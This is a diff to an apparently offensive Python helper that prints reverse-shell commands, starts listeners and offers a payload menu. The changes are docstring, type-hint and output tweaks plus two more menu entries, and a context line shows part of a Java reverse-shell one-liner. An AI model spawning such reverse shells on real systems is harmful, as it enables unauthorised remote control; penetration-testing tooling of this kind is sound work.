@@ -47,8 +47,17 @@ color = [
 reset_color = "\033[0m"
 
 
-def signal_handler(sig, frame):
-    """Exit gracefully on signals."""
+def signal_handler(sig: int, frame: object):
+    """
+    Exit gracefully on signals.
+
+    Parameters
+    ----------
+    sig : int
+        Signal number
+    frame : object
+        The signal frame
+    """
     print("\nBye!")
     sys.exit(1)
 
@@ -118,8 +127,8 @@ def shell(listener: str):
     """
     Print information on how to spawn a reverse shell and start a listener.
 
-    Params
-    ------
+    Parameters
+    ----------
     listener : str
         Optionally define the listener command to use instead of (xxx will be replaced by the IP address, yyy will be replaced by the port)
     """
@@ -361,7 +370,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
         print(
             "For Linux shells use https://github.com/jonasw234/upgrade-tty to upgrade your TTY!\n"
         )
-    print(reset_color)
+    print(reset_color, end='')
     command = []
     if os.geteuid() != 0 and int(port) < 1024:
         command.append("sudo")
@@ -396,7 +405,7 @@ def payload():
     while True:
         ven = input("Enter payload: ")
         try:
-            if int(ven) < 1 or int(ven) > 15:
+            if int(ven) < 1 or int(ven) > 17:
                 raise ValueError
             break
         except ValueError:
@@ -511,7 +520,7 @@ run -j"""
         sys.exit(1)
 
     print(f"{choice(color)}         |--Shell Spawning--|\n")
-    print(reset_color)
+    print(reset_color, end='')
     command = []
     if os.geteuid() != 0 and int(port) < 1024:
         command.append("sudo ")
